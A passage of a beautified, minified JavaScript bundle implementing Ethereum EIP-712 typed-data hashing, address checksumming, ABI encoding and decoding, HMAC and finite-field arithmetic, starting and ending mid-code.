        name: "version",
        type: "string"
    }, (typeof e?.chainId == "number" || typeof e?.chainId == "bigint") && {
        name: "chainId",
        type: "uint256"
    }, e?.verifyingContract && {
        name: "verifyingContract",
        type: "address"
    }, e?.salt && {
        name: "salt",
        type: "bytes32"
    }].filter(Boolean)
}

function iT(e) {
    if (e === "address" || e === "bool" || e === "string" || e.startsWith("bytes") || e.startsWith("uint") || e.startsWith("int")) throw new rT({
        type: e
    })
}

function oT(e) {
    const {
        domain: t = {},
        message: n,
        primaryType: r
    } = e, s = {
        EIP712Domain: rx({
            domain: t
        }),
        ...e.types
    };
    nx({
        domain: t,
        message: n,
        primaryType: r,
        types: s
    });
    const i = ["0x1901"];
    return t && i.push(aT({
        domain: t,
        types: s
    })), r !== "EIP712Domain" && i.push(sx({
        data: n,
        primaryType: r,
        types: s
    })), We(qt(i))
}

function aT({
    domain: e,
    types: t
}) {
    return sx({
        data: e,
        primaryType: "EIP712Domain",
        types: t
    })
}

function sx({
    data: e,
    primaryType: t,
    types: n
}) {
    const r = ix({
        data: e,
        primaryType: t,
        types: n
    });
    return We(r)
}

function ix({
    data: e,
    primaryType: t,
    types: n
}) {
    const r = [{
            type: "bytes32"
        }],
        s = [cT({
            primaryType: t,
            types: n
        })];
    for (const i of n[t]) {
        const [o, a] = ax({
            types: n,
            name: i.name,
            type: i.type,
            value: e[i.name]
        });
        r.push(o), s.push(a)
    }
    return hs(r, s)
}

function cT({
    primaryType: e,
    types: t
}) {
    const n = Xn(lT({
        primaryType: e,
        types: t
    }));
    return We(n)
}

function lT({
    primaryType: e,
    types: t
}) {
    let n = "";
    const r = ox({
        primaryType: e,
        types: t
    });
    r.delete(e);
    const s = [e, ...Array.from(r).sort()];
    for (const i of s) n += `${i}(${t[i].map(({name:o,type:a})=>`
    $ {
        a
    }
    $ {
        o
    }
    `).join(",")})`;
    return n
}

function ox({
    primaryType: e,
    types: t
}, n = new Set) {
    const s = e.match(/^\w*/u)?.[0];
    if (n.has(s) || t[s] === void 0) return n;
    n.add(s);
    for (const i of t[s]) ox({
        primaryType: i.type,
        types: t
    }, n);
    return n
}

function ax({
    types: e,
    name: t,
    type: n,
    value: r
}) {
    if (e[n] !== void 0) return [{
        type: "bytes32"
    }, We(ix({
        data: r,
        primaryType: n,
        types: e
    }))];
    if (n === "bytes") return [{
        type: "bytes32"
    }, We(r)];
    if (n === "string") return [{
        type: "bytes32"
    }, We(Xn(r))];
    if (n.lastIndexOf("]") === n.length - 1) {
        const s = n.slice(0, n.lastIndexOf("[")),
            i = r.map(o => ax({
                name: t,
                type: s,
                types: e,
                value: o
            }));
        return [{
            type: "bytes32"
        }, We(hs(i.map(([o]) => o), i.map(([, o]) => o)))]
    }
    return [{
        type: n
    }, r]
}
class uT extends Map {
    constructor(t) {
        super(), Object.defineProperty(this, "maxSize", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.maxSize = t
    }
    get(t) {
        const n = super.get(t);
        return super.has(t) && n !== void 0 && (this.delete(t), super.set(t, n)), n
    }
    set(t, n) {
        if (super.set(t, n), this.maxSize && this.size > this.maxSize) {
            const r = this.keys().next().value;
            r && this.delete(r)
        }
        return this
    }
}
const fT = {
        checksum: new uT(8192)
    },
    ou = fT.checksum;

function cx(e, t = {}) {
    const {
        as: n = typeof e == "string" ? "Hex" : "Bytes"
    } = t, r = Bb(Iv(e));
    return n === "Bytes" ? r : tn(r)
}
const dT = /^0x[a-fA-F0-9]{40}$/;

function Cl(e, t = {}) {
    const {
        strict: n = !0
    } = t;
    if (!dT.test(e)) throw new Tp({
        address: e,
        cause: new hT
    });
    if (n) {
        if (e.toLowerCase() === e) return;
        if (lx(e) !== e) throw new Tp({
            address: e,
            cause: new pT
        })
    }
}

function lx(e) {
    if (ou.has(e)) return ou.get(e);
    Cl(e, {
        strict: !1
    });
    const t = e.substring(2).toLowerCase(),
        n = cx(Nv(t), {
            as: "Bytes"
        }),
        r = t.split("");
    for (let i = 0; i < 40; i += 2) n[i >> 1] >> 4 >= 8 && r[i] && (r[i] = r[i].toUpperCase()), (n[i >> 1] & 15) >= 8 && r[i + 1] && (r[i + 1] = r[i + 1].toUpperCase());
    const s = `0x${r.join("")}`;
    return ou.set(e, s), s
}

function l0(e, t = {}) {
    const {
        strict: n = !0
    } = t ?? {};
    try {
        return Cl(e, {
            strict: n
        }), !0
    } catch {
        return !1
    }
}
class Tp extends ce {
    constructor({
        address: t,
        cause: n
    }) {
        super(`Address "${t}" is invalid.`, {
            cause: n
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Address.InvalidAddressError"
        })
    }
}
class hT extends ce {
    constructor() {
        super("Address is not a 20 byte (40 hexadecimal character) value."), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Address.InvalidInputError"
        })
    }
}
class pT extends ce {
    constructor() {
        super("Address does not match its checksum counterpart."), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Address.InvalidChecksumError"
        })
    }
}
const mT = /^(.*)\[([0-9]*)\]$/,
    bT = /^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/,
    ux = /^(u?int)(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/,
    Sp = 2n ** 256n - 1n;

function Ds(e, t, n) {
    const {
        checksumAddress: r,
        staticPosition: s
    } = n, i = md(t.type);
    if (i) {
        const [o, a] = i;
        return xT(e, {
            ...t,
            type: a
        }, {
            checksumAddress: r,
            length: o,
            staticPosition: s
        })
    }
    if (t.type === "tuple") return ET(e, t, {
        checksumAddress: r,
        staticPosition: s
    });
    if (t.type === "address") return gT(e, {
        checksum: r
    });
    if (t.type === "bool") return yT(e);
    if (t.type.startsWith("bytes")) return wT(e, t, {
        staticPosition: s
    });
    if (t.type.startsWith("uint") || t.type.startsWith("int")) return _T(e, t);
    if (t.type === "string") return vT(e, {
        staticPosition: s
    });
    throw new gd(t.type)
}
const Cp = 32,
    u0 = 32;

function gT(e, t = {}) {
    const {
        checksum: n = !1
    } = t, r = e.readBytes(32);
    return [(i => n ? lx(i) : i)(tn(Ov(r, -20))), 32]
}

function xT(e, t, n) {
    const {
        checksumAddress: r,
        length: s,
        staticPosition: i
    } = n;
    if (!s) {
        const c = Vn(e.readBytes(u0)),
            u = i + c,
            l = u + Cp;
        e.setPosition(u);
        const f = Vn(e.readBytes(Cp)),
            d = Oo(t);
        let h = 0;
        const b = [];
        for (let m = 0; m < f; ++m) {
            e.setPosition(l + (d ? m * 32 : h));
            const [_, E] = Ds(e, t, {
                checksumAddress: r,
                staticPosition: l
            });
            h += E, b.push(_)
        }
        return e.setPosition(i + 32), [b, 32]
    }
    if (Oo(t)) {
        const c = Vn(e.readBytes(u0)),
            u = i + c,
            l = [];
        for (let f = 0; f < s; ++f) {
            e.setPosition(u + f * 32);
            const [d] = Ds(e, t, {
                checksumAddress: r,
                staticPosition: u
            });
            l.push(d)
        }
        return e.setPosition(i + 32), [l, 32]
    }
    let o = 0;
    const a = [];
    for (let c = 0; c < s; ++c) {
        const [u, l] = Ds(e, t, {
            checksumAddress: r,
            staticPosition: i + o
        });
        o += l, a.push(u)
    }
    return [a, o]
}

function yT(e) {
    return [Mv(e.readBytes(32), {
        size: 32
    }), 32]
}

function wT(e, t, {
    staticPosition: n
}) {
    const [r, s] = t.type.split("bytes");
    if (!s) {
        const o = Vn(e.readBytes(32));
        e.setPosition(n + o);
        const a = Vn(e.readBytes(32));
        if (a === 0) return e.setPosition(n + 32), ["0x", 32];
        const c = e.readBytes(a);
        return e.setPosition(n + 32), [tn(c), 32]
    }
    return [tn(e.readBytes(Number.parseInt(s, 10), 32)), 32]
}

function _T(e, t) {
    const n = t.type.startsWith("int"),
        r = Number.parseInt(t.type.split("int")[1] || "256", 10),
        s = e.readBytes(32);
    return [r > 48 ? Rv(s, {
        signed: n
    }) : Vn(s, {
        signed: n
    }), 32]
}

function ET(e, t, n) {
    const {
        checksumAddress: r,
        staticPosition: s
    } = n, i = t.components.length === 0 || t.components.some(({
        name: c
    }) => !c), o = i ? [] : {};
    let a = 0;
    if (Oo(t)) {
        const c = Vn(e.readBytes(u0)),
            u = s + c;
        for (let l = 0; l < t.components.length; ++l) {
            const f = t.components[l];
            e.setPosition(u + a);
            const [d, h] = Ds(e, f, {
                checksumAddress: r,
                staticPosition: u
            });
            a += h, o[i ? l : f?.name] = d
        }
        return e.setPosition(s + 32), [o, 32]
    }
    for (let c = 0; c < t.components.length; ++c) {
        const u = t.components[c],
            [l, f] = Ds(e, u, {
                checksumAddress: r,
                staticPosition: s
            });
        o[i ? c : u?.name] = l, a += f
    }
    return [o, a]
}

function vT(e, {
    staticPosition: t
}) {
    const n = Vn(e.readBytes(32)),
        r = t + n;
    e.setPosition(r);
    const s = Vn(e.readBytes(32));
    if (s === 0) return e.setPosition(t + 32), ["", 32];
    const i = e.readBytes(s, 32),
        o = kv(Tg(i));
    return e.setPosition(t + 32), [o, 32]
}

function TT({
    checksumAddress: e,
    parameters: t,
    values: n
}) {
    const r = [];
    for (let s = 0; s < t.length; s++) r.push(hd({
        checksumAddress: e,
        parameter: t[s],
        value: n[s]
    }));
    return r
}

function hd({
    checksumAddress: e = !1,
    parameter: t,
    value: n
}) {
    const r = t,
        s = md(r.type);
    if (s) {
        const [i, o] = s;
        return CT(n, {
            checksumAddress: e,
            length: i,
            parameter: {
                ...r,
                type: o
            }
        })
    }
    if (r.type === "tuple") return OT(n, {
        checksumAddress: e,
        parameter: r
    });
    if (r.type === "address") return ST(n, {
        checksum: e
    });
    if (r.type === "bool") return AT(n);
    if (r.type.startsWith("uint") || r.type.startsWith("int")) {
        const i = r.type.startsWith("int"),
            [, , o = "256"] = ux.exec(r.type) ?? [];
        return NT(n, {
            signed: i,
            size: Number(o)
        })
    }
    if (r.type.startsWith("bytes")) return IT(n, {
        type: r.type
    });
    if (r.type === "string") return PT(n);
    throw new gd(r.type)
}

function pd(e) {
    let t = 0;
    for (let i = 0; i < e.length; i++) {
        const {
            dynamic: o,
            encoded: a
        } = e[i];
        o ? t += 32 : t += kt(a)
    }
    const n = [],
        r = [];
    let s = 0;
    for (let i = 0; i < e.length; i++) {
        const {
            dynamic: o,
            encoded: a
        } = e[i];
        o ? (n.push(ct(t + s, {
            size: 32
        })), r.push(a), s += kt(a)) : n.push(a)
    }
    return en(...n, ...r)
}

function ST(e, t) {
    const {
        checksum: n = !1
    } = t;
    return Cl(e, {
        strict: n
    }), {
        dynamic: !1,
        encoded: as(e.toLowerCase())
    }
}

function CT(e, t) {
    const {
        checksumAddress: n,
        length: r,
        parameter: s
    } = t, i = r === null;
    if (!Array.isArray(e)) throw new UT(e);
    if (!i && e.length !== r) throw new FT({
        expectedLength: r,
        givenLength: e.length,
        type: `${s.type}[${r}]`
    });
    let o = !1;
    const a = [];
    for (let c = 0; c < e.length; c++) {
        const u = hd({
            checksumAddress: n,
            parameter: s,
            value: e[c]
        });
        u.dynamic && (o = !0), a.push(u)
    }
    if (i || o) {
        const c = pd(a);
        if (i) {
            const u = ct(a.length, {
                size: 32
            });
            return {
                dynamic: !0,
                encoded: a.length > 0 ? en(u, c) : u
            }
        }
        if (o) return {
            dynamic: !0,
            encoded: c
        }
    }
    return {
        dynamic: !1,
        encoded: en(...a.map(({
            encoded: c
        }) => c))
    }
}

function IT(e, {
    type: t
}) {
    const [, n] = t.split("bytes"), r = kt(e);
    if (!n) {
        let s = e;
        return r % 32 !== 0 && (s = cs(s, Math.ceil((e.length - 2) / 2 / 32) * 32)), {
            dynamic: !0,
            encoded: en(as(ct(r, {
                size: 32
            })), s)
        }
    }
    if (r !== Number.parseInt(n, 10)) throw new dx({
        expectedSize: Number.parseInt(n, 10),
        value: e
    });
    return {
        dynamic: !1,
        encoded: cs(e)
    }
}

function AT(e) {
    if (typeof e != "boolean") throw new ce(`Invalid boolean value: "${e}" (type: ${typeof e}). Expected: \`true\` or \`false\`.`);
    return {
        dynamic: !1,
        encoded: as(Sg(e))
    }
}

function NT(e, {
    signed: t,
    size: n
}) {
    if (typeof n == "number") {
        const r = 2n ** (BigInt(n) - (t ? 1n : 0n)) - 1n,
            s = t ? -r - 1n : 0n;
        if (e > r || e < s) throw new Ag({
            max: r.toString(),
            min: s.toString(),
            signed: t,
            size: n / 8,
            value: e.toString()
        })
    }
    return {
        dynamic: !1,
        encoded: ct(e, {
            size: 32,
            signed: t
        })
    }
}

function PT(e) {
    const t = sd(e),
        n = Math.ceil(kt(t) / 32),
        r = [];
    for (let s = 0; s < n; s++) r.push(cs(hn(t, s * 32, (s + 1) * 32)));
    return {
        dynamic: !0,
        encoded: en(cs(ct(kt(t), {
            size: 32
        })), ...r)
    }
}

function OT(e, t) {
    const {
        checksumAddress: n,
        parameter: r
    } = t;
    let s = !1;
    const i = [];
    for (let o = 0; o < r.components.length; o++) {
        const a = r.components[o],
            c = Array.isArray(e) ? o : a.name,
            u = hd({
                checksumAddress: n,
                parameter: a,
                value: e[c]
            });
        i.push(u), u.dynamic && (s = !0)
    }
    return {
        dynamic: s,
        encoded: s ? pd(i) : en(...i.map(({
            encoded: o
        }) => o))
    }
}

function md(e) {
    const t = e.match(/^(.*)\[(\d+)?\]$/);
    return t ? [t[2] ? Number(t[2]) : null, t[1]] : void 0
}

function Oo(e) {
    const {
        type: t
    } = e;
    if (t === "string" || t === "bytes" || t.endsWith("[]")) return !0;
    if (t === "tuple") return e.components?.some(Oo);
    const n = md(e.type);
    return !!(n && Oo({
        ...e,
        type: n[1]
    }))
}
const RT = {
    bytes: new Uint8Array,
    dataView: new DataView(new ArrayBuffer(0)),
    position: 0,
    positionReadCount: new Map,
    recursiveReadCount: 0,
    recursiveReadLimit: Number.POSITIVE_INFINITY,
    assertReadLimit() {
        if (this.recursiveReadCount >= this.recursiveReadLimit) throw new BT({
            count: this.recursiveReadCount + 1,
            limit: this.recursiveReadLimit
        })
    },
    assertPosition(e) {
        if (e < 0 || e > this.bytes.length - 1) throw new kT({
            length: this.bytes.length,
            position: e
        })
    },
    decrementPosition(e) {
        if (e < 0) throw new Ip({
            offset: e
        });
        const t = this.position - e;
        this.assertPosition(t), this.position = t
    },
    getReadCount(e) {
        return this.positionReadCount.get(e || this.position) || 0
    },
    incrementPosition(e) {
        if (e < 0) throw new Ip({
            offset: e
        });
        const t = this.position + e;
        this.assertPosition(t), this.position = t
    },
    inspectByte(e) {
        const t = e ?? this.position;
        return this.assertPosition(t), this.bytes[t]
    },
    inspectBytes(e, t) {
        const n = t ?? this.position;
        return this.assertPosition(n + e - 1), this.bytes.subarray(n, n + e)
    },
    inspectUint8(e) {
        const t = e ?? this.position;
        return this.assertPosition(t), this.bytes[t]
    },
    inspectUint16(e) {
        const t = e ?? this.position;
        return this.assertPosition(t + 1), this.dataView.getUint16(t)
    },
    inspectUint24(e) {
        const t = e ?? this.position;
        return this.assertPosition(t + 2), (this.dataView.getUint16(t) << 8) + this.dataView.getUint8(t + 2)
    },
    inspectUint32(e) {
        const t = e ?? this.position;
        return this.assertPosition(t + 3), this.dataView.getUint32(t)
    },
    pushByte(e) {
        this.assertPosition(this.position), this.bytes[this.position] = e, this.position++
    },
    pushBytes(e) {
        this.assertPosition(this.position + e.length - 1), this.bytes.set(e, this.position), this.position += e.length
    },
    pushUint8(e) {
        this.assertPosition(this.position), this.bytes[this.position] = e, this.position++
    },
    pushUint16(e) {
        this.assertPosition(this.position + 1), this.dataView.setUint16(this.position, e), this.position += 2
    },
    pushUint24(e) {
        this.assertPosition(this.position + 2), this.dataView.setUint16(this.position, e >> 8), this.dataView.setUint8(this.position + 2, e & 255), this.position += 3
    },
    pushUint32(e) {
        this.assertPosition(this.position + 3), this.dataView.setUint32(this.position, e), this.position += 4
    },
    readByte() {
        this.assertReadLimit(), this._touch();
        const e = this.inspectByte();
        return this.position++, e
    },
    readBytes(e, t) {
        this.assertReadLimit(), this._touch();
        const n = this.inspectBytes(e);
        return this.position += t ?? e, n
    },
    readUint8() {
        this.assertReadLimit(), this._touch();
        const e = this.inspectUint8();
        return this.position += 1, e
    },
    readUint16() {
        this.assertReadLimit(), this._touch();
        const e = this.inspectUint16();
        return this.position += 2, e
    },
    readUint24() {
        this.assertReadLimit(), this._touch();
        const e = this.inspectUint24();
        return this.position += 3, e
    },
    readUint32() {
        this.assertReadLimit(), this._touch();
        const e = this.inspectUint32();
        return this.position += 4, e
    },
    get remaining() {
        return this.bytes.length - this.position
    },
    setPosition(e) {
        const t = this.position;
        return this.assertPosition(e), this.position = e, () => this.position = t
    },
    _touch() {
        if (this.recursiveReadLimit === Number.POSITIVE_INFINITY) return;
        const e = this.getReadCount();
        this.positionReadCount.set(this.position, e + 1), e > 0 && this.recursiveReadCount++
    }
};

function MT(e, {
    recursiveReadLimit: t = 8192
} = {}) {
    const n = Object.create(RT);
    return n.bytes = e, n.dataView = new DataView(e.buffer, e.byteOffset, e.byteLength), n.positionReadCount = new Map, n.recursiveReadLimit = t, n
}
class Ip extends ce {
    constructor({
        offset: t
    }) {
        super(`Offset \`${t}\` cannot be negative.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Cursor.NegativeOffsetError"
        })
    }
}
class kT extends ce {
    constructor({
        length: t,
        position: n
    }) {
        super(`Position \`${n}\` is out of bounds (\`0 < position < ${t}\`).`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Cursor.PositionOutOfBoundsError"
        })
    }
}
class BT extends ce {
    constructor({
        count: t,
        limit: n
    }) {
        super(`Recursive read limit of \`${n}\` exceeded (recursive read count: \`${t}\`).`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "Cursor.RecursiveReadLimitExceededError"
        })
    }
}

function LT(e, t, n = {}) {
    const {
        as: r = "Array",
        checksumAddress: s = !1
    } = n, i = typeof t == "string" ? vg(t) : t, o = MT(i);
    if (Is(i) === 0 && e.length > 0) throw new DT;
    if (Is(i) && Is(i) < 32) throw new $T({
        data: typeof t == "string" ? t : tn(t),
        parameters: e,
        size: Is(i)
    });
    let a = 0;
    const c = r === "Array" ? [] : {};
    for (let u = 0; u < e.length; ++u) {
        const l = e[u];
        o.setPosition(a);
        const [f, d] = Ds(o, l, {
            checksumAddress: s,
            staticPosition: 0
        });
        a += d, r === "Array" ? c.push(f) : c[l.name ?? u] = f
    }
    return c
}

function bd(e, t, n) {
    const {
        checksumAddress: r = !1
    } = {};
    if (e.length !== t.length) throw new hx({
        expectedLength: e.length,
        givenLength: t.length
    });
    const s = TT({
            checksumAddress: r,
            parameters: e,
            values: t
        }),
        i = pd(s);
    return i.length === 0 ? "0x" : i
}

function f0(e, t) {
    if (e.length !== t.length) throw new hx({
        expectedLength: e.length,
        givenLength: t.length
    });
    const n = [];
    for (let r = 0; r < e.length; r++) {
        const s = e[r],
            i = t[r];
        n.push(f0.encode(s, i))
    }
    return en(...n)
}(function(e) {
    function t(n, r, s = !1) {
        if (n === "address") {
            const c = r;
            return Cl(c), as(c.toLowerCase(), s ? 32 : 0)
        }
        if (n === "string") return sd(r);
        if (n === "bytes") return r;
        if (n === "bool") return as(Sg(r), s ? 32 : 1);
        const i = n.match(ux);
        if (i) {
            const [c, u, l = "256"] = i, f = Number.parseInt(l, 10) / 8;
            return ct(r, {
                size: s ? 32 : f,
                signed: u === "int"
            })
        }
        const o = n.match(bT);
        if (o) {
            const [c, u] = o;
            if (Number.parseInt(u, 10) !== (r.length - 2) / 2) throw new dx({
                expectedSize: Number.parseInt(u, 10),
                value: r
            });
            return cs(r, s ? 32 : 0)
        }
        const a = n.match(mT);
        if (a && Array.isArray(r)) {
            const [c, u] = a, l = [];
            for (let f = 0; f < r.length; f++) l.push(t(u, r[f], !0));
            return l.length === 0 ? "0x" : en(...l)
        }
        throw new gd(n)
    }
    e.encode = t
})(f0 || (f0 = {}));

function fx(e) {
    return Array.isArray(e) && typeof e[0] == "string" || typeof e == "string" ? Vh(e) : e
}
class $T extends ce {
    constructor({
        data: t,
        parameters: n,
        size: r
    }) {
        super(`Data size of ${r} bytes is too small for given parameters.`, {
            metaMessages: [`Params: (${Ts(n)})`, `Data:   ${t} (${r} bytes)`]
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "AbiParameters.DataSizeTooSmallError"
        })
    }
}
class DT extends ce {
    constructor() {
        super('Cannot decode zero data ("0x") with ABI parameters.'), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "AbiParameters.ZeroDataError"
        })
    }
}
class FT extends ce {
    constructor({
        expectedLength: t,
        givenLength: n,
        type: r
    }) {
        super(`Array length mismatch for type \`${r}\`. Expected: \`${t}\`. Given: \`${n}\`.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "AbiParameters.ArrayLengthMismatchError"
        })
    }
}
class dx extends ce {
    constructor({
        expectedSize: t,
        value: n
    }) {
        super(`Size of bytes "${n}" (bytes${kt(n)}) does not match expected size (bytes${t}).`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "AbiParameters.BytesSizeMismatchError"
        })
    }
}
class hx extends ce {
    constructor({
        expectedLength: t,
        givenLength: n
    }) {
        super(["ABI encoding parameters/values length mismatch.", `Expected length (parameters): ${t}`, `Given length (values): ${n}`].join(`
`)), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "AbiParameters.LengthMismatchError"
        })
    }
}
class UT extends ce {
    constructor(t) {
        super(`Value \`${t}\` is not a valid array.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "AbiParameters.InvalidArrayError"
        })
    }
}
class gd extends ce {
    constructor(t) {
        super(`Type \`${t}\` is not a valid ABI Type.`), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "AbiParameters.InvalidTypeError"
        })
    }
}
class px extends kf {
    constructor(t, n) {
        super(), this.finished = !1, this.destroyed = !1, IE(t);
        const r = ul(n);
        if (this.iHash = t.create(), typeof this.iHash.update != "function") throw new Error("Expected instance of class which extends utils.Hash");
        this.blockLen = this.iHash.blockLen, this.outputLen = this.iHash.outputLen;
        const s = this.blockLen,
            i = new Uint8Array(s);
        i.set(r.length > s ? t.create().update(r).digest() : r);
        for (let o = 0; o < i.length; o++) i[o] ^= 54;
        this.iHash.update(i), this.oHash = t.create();
        for (let o = 0; o < i.length; o++) i[o] ^= 106;
        this.oHash.update(i), Qs(i)
    }
    update(t) {
        return Js(this), this.iHash.update(t), this
    }
    digestInto(t) {
        Js(this), ss(t, this.outputLen), this.finished = !0, this.iHash.digestInto(t), this.oHash.update(t), this.oHash.digestInto(t), this.destroy()
    }
    digest() {
        const t = new Uint8Array(this.oHash.outputLen);
        return this.digestInto(t), t
    }
    _cloneInto(t) {
        t || (t = Object.create(Object.getPrototypeOf(this), {}));
        const {
            oHash: n,
            iHash: r,
            finished: s,
            destroyed: i,
            blockLen: o,
            outputLen: a
        } = this;
        return t = t, t.finished = s, t.destroyed = i, t.blockLen = o, t.outputLen = a, t.oHash = n._cloneInto(t.oHash), t.iHash = r._cloneInto(t.iHash), t
    }
    clone() {
        return this._cloneInto()
    }
    destroy() {
        this.destroyed = !0, this.oHash.destroy(), this.iHash.destroy()
    }
}
const mx = (e, t, n) => new px(e, t).update(n).digest();
mx.create = (e, t) => new px(e, t);
const wt = BigInt(0),
    ut = BigInt(1),
    Ur = BigInt(2),
    VT = BigInt(3),
    bx = BigInt(4),
    gx = BigInt(5),
    xx = BigInt(8);

function gt(e, t) {
    const n = e % t;
    return n >= wt ? n : t + n
}

function Ft(e, t, n) {
    let r = e;
    for (; t-- > wt;) r *= r, r %= n;
    return r
}

function d0(e, t) {
    if (e === wt) throw new Error("invert: expected non-zero number");
    if (t <= wt) throw new Error("invert: expected positive modulus, got " + t);
    let n = gt(e, t),
        r = t,
        s = wt,
        i = ut;
    for (; n !== wt;) {
        const a = r / n,
            c = r % n,
            u = s - i * a;
        r = n, n = c, s = i, i = u
    }
    if (r !== ut) throw new Error("invert: does not exist");
    return gt(s, t)
}

function yx(e, t) {
    const n = (e.ORDER + ut) / bx,
        r = e.pow(t, n);
    if (!e.eql(e.sqr(r), t)) throw new Error("Cannot find square root");
    return r
}

function HT(e, t) {
    const n = (e.ORDER - gx) / xx,
        r = e.mul(t, Ur),
        s = e.pow(r, n),
        i = e.mul(t, s),
        o = e.mul(e.mul(i, Ur), s),
        a = e.mul(i, e.sub(o, e.ONE));
    if (!e.eql(e.sqr(a), t)) throw new Error("Cannot find square root");
    return a
}

function jT(e) {
    if (e < BigInt(3)) throw new Error("sqrt is not defined for small field");
    let t = e - ut,
        n = 0;
    for (; t % Ur === wt;) t /= Ur, n++;
    let r = Ur;
    const s = xd(e);
    for (; Ap(s, r) === 1;)
        if (r++ > 1e3) throw new Error("Cannot find square root: probably non-prime P");
    if (n === 1) return yx;
    let i = s.pow(r, t);
    const o = (t + ut) / Ur;
    return function(c, u) {
        if (c.is0(u)) return u;
        if (Ap(c, u) !== 1) throw new Error("Cannot find square root");
        let l = n,
            f = c.mul(c.ONE, i),
            d = c.pow(u, t),
            h = c.pow(u, o);
        for (; !c.eql(d, c.ONE);) {
            if (c.is0(d)) return c.ZERO;
            let b = 1,
                m = c.sqr(d);
            for (; !c.eql(m, c.ONE);)
                if (b++, m = c.sqr(m), b === l) throw new Error("Cannot find square root");
            const _ = ut << BigInt(l - b - 1),
                E = c.pow(f, _);
            l = b, f = c.sqr(E), d = c.mul(d, f), h = c.mul(h, E)
        }
        return h
    }
}

function zT(e) {
    return e % bx === VT ? yx : e % xx === gx ? HT : jT(e)
}
const qT = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];

function GT(e) {
    const t = {
            ORDER: "bigint",
            MASK: "bigint",
            BYTES: "isSafeInteger",
            BITS: "isSafeInteger"
        },
        n = qT.reduce((r, s) => (r[s] = "function", r), t);
    return xl(e, n)
}

function WT(e, t, n) {
    if (n < wt) throw new Error("invalid exponent, negatives unsupported");
    if (n === wt) return e.ONE;
    if (n === ut) return t;
    let r = e.ONE,
        s = t;
    for (; n > wt;) n & ut && (r = e.mul(r, s)), s = e.sqr(s), n >>= ut;
    return r
}

function wx(e, t, n = !1) {
    const r = new Array(t.length).fill(n ? e.ZERO : void 0),
        s = t.reduce((o, a, c) => e.is0(a) ? o : (r[c] = o, e.mul(o, a)), e.ONE),
        i = e.inv(s);
    return t.reduceRight((o, a, c) => e.is0(a) ? o : (r[c] = e.mul(o, r[c]), e.mul(o, a)), i), r
}

function Ap(e, t) {
    const n = (e.ORDER - ut) / Ur,
        r = e.pow(t, n),
        s = e.eql(r, e.ONE),
        i = e.eql(r, e.ZERO),
        o = e.eql(r, e.neg(e.ONE));
    if (!s && !i && !o) throw new Error("invalid Legendre symbol result");
    return s ? 1 : i ? 0 : -1
}

function _x(e, t) {
    t !== void 0 && ao(t);
    const n = t !== void 0 ? t : e.toString(2).length,
        r = Math.ceil(n / 8);
    return {
        nBitLength: n,
        nByteLength: r
    }
}

function xd(e, t, n = !1, r = {}) {
    if (e <= wt) throw new Error("invalid field: expected ORDER > 0, got " + e);
    const {
        nBitLength: s,
        nByteLength: i
    } = _x(e, t);
    if (i > 2048) throw new Error("invalid field: expected ORDER of <= 2048 bytes");
    let o;
    const a = Object.freeze({
        ORDER: e,
        isLE: n,
        BITS: s,
        BYTES: i,
        MASK: gl(s),
        ZERO: wt,
        ONE: ut,
        create: c => gt(c, e),
        isValid: c => {
            if (typeof c != "bigint") throw new Error("invalid field element: expected bigint, got " + typeof c);
            return wt <= c && c < e
        },
        is0: c => c === wt,
        isOdd: c => (c & ut) === ut,
        neg: c => gt(-c, e),
        eql: (c, u) => c === u,
        sqr: c => gt(c * c, e),
        add: (c, u) => gt(c + u, e),
        sub: (c, u) => gt(c - u, e),
        mul: (c, u) => gt(c * u, e),
        pow: (c, u) => WT(a, c, u),
        div: (c, u) => gt(c * d0(u, e), e),
        sqrN: c => c * c,
        addN: (c, u) => c + u,
        subN: (c, u) => c - u,
        mulN: (c, u) => c * u,
        inv: c => d0(c, e),
        sqrt: r.sqrt || (c => (o || (o = zT(e)), o(a, c))),
        toBytes: c => n ? xg(c, i) : sa(c, i),
        fromBytes: c => {
            if (c.length !== i) throw new Error("Field.fromBytes: expected " + i + " bytes, got " + c.length);
            return n ? gg(c) : Zr(c)
        },
        invertBatch: c => wx(a, c),
        cmov: (c, u, l) => l ? u : c
    });
    return Object.freeze(a)
}

function Ex(e) {
    if (typeof e != "bigint") throw new Error("field order must be bigint");
    const t = e.toString(2).length;
    return Math.ceil(t / 8)
}

function vx(e) {
    const t = Ex(e);
    return t + Math.ceil(t / 2)
}

function XT(e, t, n = !1) {
    const r = e.length,
        s = Ex(t),
        i = vx(t);
    if (r < 16 || r < i || r > 1024) throw new Error("expected " + i + "-1024 bytes of input, got " + r);
    const o = n ? gg(e) : Zr(e),
        a = gt(o, t - ut) + ut;
    return n ? xg(a, s) : sa(a, s)
}
const Np = BigInt(0),
    h0 = BigInt(1);

function au(e, t) {
    const n = t.negate();
    return e ? n : t
}

function Tx(e, t) {
    if (!Number.isSafeInteger(e) || e <= 0 || e > t) throw new Error("invalid window size, expected [1.." + t + "], got W=" + e)
}

function cu(e, t) {
    Tx(e, t);
    const n = Math.ceil(t / e) + 1,
